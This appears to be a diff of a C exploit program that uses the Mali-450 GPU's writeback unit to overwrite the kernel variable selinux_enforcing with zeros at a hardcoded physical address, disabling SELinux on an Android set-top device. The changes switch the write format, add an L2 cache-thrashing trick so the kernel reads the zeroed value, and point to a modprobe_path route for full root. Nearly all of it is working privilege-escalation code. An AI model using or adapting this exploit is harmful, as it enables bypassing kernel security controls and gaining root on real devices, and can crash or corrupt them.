@@ -1,13 +1,17 @@
 /*
- * kort_selinux_1x1.c - Try to disable SELinux with 1x1 frame (smaller write)
+ * kort_selinux_1x1.c - Try to disable SELinux with 1x1 frame
  *
- * 16x16 frame = 1024 bytes write caused kernel panic.
- * 1x1 frame with R8 format = only 136 bytes.
- * Maybe 136 bytes won't crash the kernel.
+ * 16x16 frame = 1024 bytes write caused kernel panic (proved write lands).
+ * 1x1 frame = ~184 bytes (RGBA8888) write, 8-byte aligned.
+ *
+ * NOTE: R8 (0x04) WB format is REJECTED by Mali-450 PP writeback -> PP job
+ * aborts (status 0x800000). Default is now RGBA8888 (0x03), the proven format.
  *
  * selinux_enforcing: phys=0x02a394ec, page=0x02a39000, inpage=0x4ec
  * WB_ADDRESS 8-byte aligned -> write starts at 0x4e8
  * selinux_enforcing is at offset 0x4ec = write_base + 4
+ *
+ * WARNING: ~184-byte blast-radius write still corrupts neighbours -> likely panic.
  */
 
 #include <stdio.h>
@@ -189,7 +193,12 @@ static int wb_write(uint32_t tgt_offset, uint32_t clear_color, uint32_t pixfmt)
 
     uint32_t status;
     memcpy(&status, notif.data + 8, 4);
-    if (!(status & (1 << 16))) return -1;
+    if (!(status & (1 << 16))) {
+        /* bit16 clear => 0x800000 (PP job aborted by HW).
+         * Typical cause: unsupported WB pixel format (e.g. R8/0x04 on Mali-450). */
+        printf("[-] PP FAILED (status=0x%08x)\n", status);
+        return -1;
+    }
     return 0;
 }
 
@@ -203,12 +212,19 @@ int main(int argc, char **argv)
 
     printf("=== SELinux Disable Test (1x1 small write) ===\n\n");
 
-    /* Choose format: 0x04=R8 (136 bytes, smallest), 0x03=RGBA8888 (184 bytes) */
-    uint32_t pixfmt = 0x04;  /* R8 - smallest write */
-    const char *fmtname = "R8/136B";
-    if (argc > 1 && strcmp(argv[1], "--rgba") == 0) {
-        pixfmt = 0x03;
-        fmtname = "RGBA8888/184B";
+    /* Choose format: 0x03=RGBA8888 (184 bytes) is the PROVEN working WB format.
+     * 0x04 (R8) is REJECTED by the Mali-450 PP writeback unit -> PP job aborts
+     * (status 0x800000, bit16 clear) -> "WB FAILED". Do NOT use R8 as default. */
+    uint32_t pixfmt = 0x03;  /* RGBA8888 - proven working WB format */
+    const char *fmtname = "RGBA8888/184B";
+    if (argc > 1) {
+        if (strcmp(argv[1], "--rgba") == 0) {
+            pixfmt = 0x03;
+            fmtname = "RGBA8888/184B";
+        } else if (strcmp(argv[1], "--r8") == 0) {
+            pixfmt = 0x04;  /* debug only: expect PP FAILED (0x800000) */
+            fmtname = "R8/136B (DEBUG: usually aborts)";
+        }
     }
 
     printf("selinux_enforcing: phys=0x%08x, page=0x%08x, offset=0x%x\n",
@@ -255,8 +271,10 @@ int main(int argc, char **argv)
 
     /*
      * Write 0 to selinux_enforcing.
-     * For R8 format (fmt=0x04), all bytes = R channel value.
-     * clear_color ARGB: R=bits23-16. So set R=0 to write 0 bytes.
+     * With RGBA8888 (default), clear_color=0 makes every written byte 0,
+     * so selinux_enforcing (4 bytes at inpage +0x4 within the 184-byte block)
+     * becomes 0x00000000. Address confirmed via vmlinux kallsyms:
+     * RVA 0x19B94EC, phys 0x02A394EC.
      */
     uint32_t clear_color = 0x00000000;  /* R=0, G=0, B=0, A=0 */
 
@@ -275,6 +293,17 @@ int main(int argc, char **argv)
     printf("[*] WB write 0 to offset 0x%x (selinux_enforcing at +0x%x)\n",
            write_offset, SELINUX_ENFORCING_INPAGE & 7);
 
+    /*
+     * WARNING: This primitive writes an 8-byte-aligned, ~184-byte block.
+     * selinux_enforcing sits at inpage 0x4ec, so the write covers phys
+     * 0x02a394e8..0x02a395a0 -> it zeroes selinux_enforcing AND ~180 bytes of
+     * neighbouring kernel data. On Mali this almost always panics the kernel
+     * (the 16x16 test already proved the write lands, then rebooted).
+     * This route is inherently unsafe for surgical 4-byte writes. Prefer the
+     * modprobe_path route in kort_miboxs_1x1.c for the actual root.
+     */
+    printf("[!] NOTE: ~184-byte blast-radius write will likely PANIC the kernel.\n");
+
     int rc = wb_write(write_offset, clear_color, pixfmt);
     if (rc == -999) {
         printf("[-] WB TIMEOUT / HUNG!\n");
@@ -286,28 +315,54 @@ int main(int argc, char **argv)
     }
     printf("[+] WB WRITE OK\n");
 
-    printf("\n[*] If device is still alive, SELinux might be disabled!\n");
-    printf("[*] Checking getenforce in 2 seconds...\n");
-    sleep(2);
-
-    /* Try to read selinux status */
-    int pfd = open("/proc/sys/fs/selinux/enforce", O_RDONLY);
-    if (pfd >= 0) {
-        char buf[16] = {0};
-        int n = read(pfd, buf, sizeof(buf)-1);
-        close(pfd);
-        printf("[+] /proc/sys/fs/selinux/enforce = %s", buf);
-    } else {
-        printf("[-] Cannot read /proc/sys/fs/selinux/enforce: %s\n", strerror(errno));
+    /*
+     * Cache-coherency workaround (the REAL blocker on this SoC):
+     * Mali WB writes the 0 into DRAM, but selinux_enforcing is a hot,
+     * CPU-cached variable -> the kernel keeps reading the stale cached value (1).
+     * L2 is physically-indexed and shared, so a large userspace memset thrashes
+     * L2 and evicts that cache line. The NEXT kernel read then fetches our
+     * GPU-written 0 from DRAM and re-caches it as 0 (stays 0 afterwards).
+     */
+    printf("[*] Thrashing L2 to evict selinux_enforcing cache line...\n");
+    {
+        size_t thrash = 64ULL * 1024 * 1024;
+        volatile unsigned char *tp = (unsigned char *)malloc(thrash);
+        if (tp) {
+            for (size_t i = 0; i < thrash; i += 64)
+                tp[i] = (unsigned char)(i & 0xff);  /* dirty every cache line */
+            free((void *)tp);
+        } else {
+            printf("[!] malloc thrash failed, coherency workaround SKIPPED\n");
+        }
     }
 
-    /* Also try getenforce via shell command output */
-    /* We can't run getenforce here easily, but user can check manually */
+    printf("\n[*] Re-checking SELinux status (expect 0 = Permissive/Disabled)...\n");
+    for (int attempt = 0; attempt < 3; attempt++) {
+        int pfd = open("/sys/fs/selinux/enforce", O_RDONLY);
+        if (pfd >= 0) {
+            char buf[16] = {0};
+            int n = read(pfd, buf, sizeof(buf) - 1);
+            close(pfd);
+            if (n > 0) {
+                buf[n] = 0;
+                printf("  [#%d] /sys/fs/selinux/enforce = %s", attempt, buf);
+                if (buf[0] == '0')
+                    printf("  >>> SELinux DISABLED!\n");
+            }
+        } else {
+            printf("  [#%d] cannot open /sys/fs/selinux/enforce: %s\n",
+                   attempt, strerror(errno));
+        }
+        sleep(1);
+    }
+
+    /* Authoritative answer from the shell */
+    printf("[*] getenforce ->\n");
+    system("getenforce 2>/dev/null || cat /sys/fs/selinux/enforce 2>/dev/null");
 
     munmap(data_buf, DATA_SIZE);
     close(fd);
 
-    printf("\n[*] Done. If device didn't reboot, SELinux may be Permissive.\n");
-    printf("[*] Run: adb shell getenforce\n");
+    printf("\n[*] Done. If device didn't reboot and enforce==0, SELinux is off.\n");
     return 0;
 }
